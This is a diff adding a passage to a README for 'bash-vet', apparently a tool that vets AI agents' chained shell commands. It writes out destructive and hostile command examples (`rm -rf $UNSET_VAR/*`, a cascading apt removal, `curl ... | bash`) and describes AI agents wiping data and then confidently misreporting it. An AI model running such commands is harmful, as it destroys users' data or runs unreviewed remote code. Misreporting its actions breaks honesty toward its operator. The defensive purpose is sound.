@@ -12,6 +12,12 @@
 
 Production AI agents have a quiet failure mode in shell-command execution: the agent emits a chained command, the operator pattern-matches the start of the line, and a destructive fragment nested deep in the chain (`&&`, `;`, `|`) gets executed by accident.
 
+A working engineer ([@chiefofautism, 158↑ / 135 RTs / 11.5K views](https://x.com/chiefofautism/status/2023151450503753972)) puts it more bluntly:
+
+> *"claude code runs shell commands with YOUR permissions. it can rm -rf your repo. it can force push to main. it can drop your database. and it will do it confidently while telling you that he cleaned up the project structure"*
+
+The danger isn't just the destructive command — it's the **confident misreport** that follows. bash-vet attacks the first half of that pair (the "rm -rf / force-push / drop database" part); pair it with [openclaw-output-vetter-mcp](https://github.com/temurkhan13/openclaw-output-vetter-mcp) for the second half (the "while telling you he cleaned up the project structure" part).
+
 - **Buried `rm -rf`.** [r/LocalLLaMA "One bash permission slipped" (1,512↑)](https://old.reddit.com/r/LocalLLaMA/) — operator approved a long chained command after recognizing the lede; the chain ended with `rm -rf $UNSET_VAR/*` which expanded to `rm -rf /*` because the variable was empty. The classic xornullvoid wipeout was `apt remove '*nvidia*595*'` cascading into critical-package removal.
 - **CVSS 10.0 in agent harnesses.** [r/devops "AI coding tools are now a CVSS 10.0 supply-chain risk" (130↑)](https://old.reddit.com/r/devops/) cites Cursor CVE-2026-26268 and Gemini CLI CVSS 10.0 — both featuring `--yolo` modes that ignore allowlists entirely and execute LLM-emitted commands without operator review.
 - **Network-exfil via curl-pipe-bash.** Agents trained on installer documentation pattern-match `curl https://x.com/install.sh | bash` as legitimate. Once the agent is the one fetching the URL, the operator has no way to inspect the script before it runs.
